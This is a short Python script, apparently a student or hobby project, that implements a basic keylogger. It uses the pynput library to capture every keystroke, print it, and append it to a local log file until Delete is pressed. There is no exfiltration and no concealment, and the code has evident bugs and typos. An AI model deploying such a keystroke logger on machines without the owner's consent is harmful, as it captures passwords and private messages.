#################################################
# Name: Daniel Pena
#
# Date: 6/25/2022
# Program: Keylogger
# Purpose: Pyhton Implimentation of  a Keylogger
# to cancel the program press the delete button
#################################################

import pynput
from pynput import keyboard

global keys_pressed

#When a user  presses something on the keyboard
def On_Keyboard_Press(key):
    keys_pressed = []
    print("{0} pressed".format(key))
    keys_pressed.append(key)
    #Write_File(keys_pressed)
    process_Keys(keys_pressed)

#Formats the output based on what type of key is pressed
def process_Keys(keys_pressed):
    for key in keys_pressed:
        str_Key = str(key).replace("'","")
        if str_Key == str(keyboard.Key.space):
            str_Key =  " "
        elif str_Key == str(keyboard.Key.enter):
            str_Key = "\n"
    Write_File(str_Key)

def Write_File(str_Key):
    with open("./Keylogger/log.txt", "a") as f:
        f.write(str_Key)

#Ends the Keylogger if the delete Key is pressed
def On_Keyboard_Realse(key):
    print("KEYBOARD REALSE")
    if key == keyboard.Key.delete:
        return False

def clean_File():
    with open("./Keylogger/log.txt", "w") as f:
            pass
#Collects all the evetns
with keyboard.Listener(On_Keyboard_Press, On_Keyboard_Realse) as listener:
    clean_File()
    listener.join()
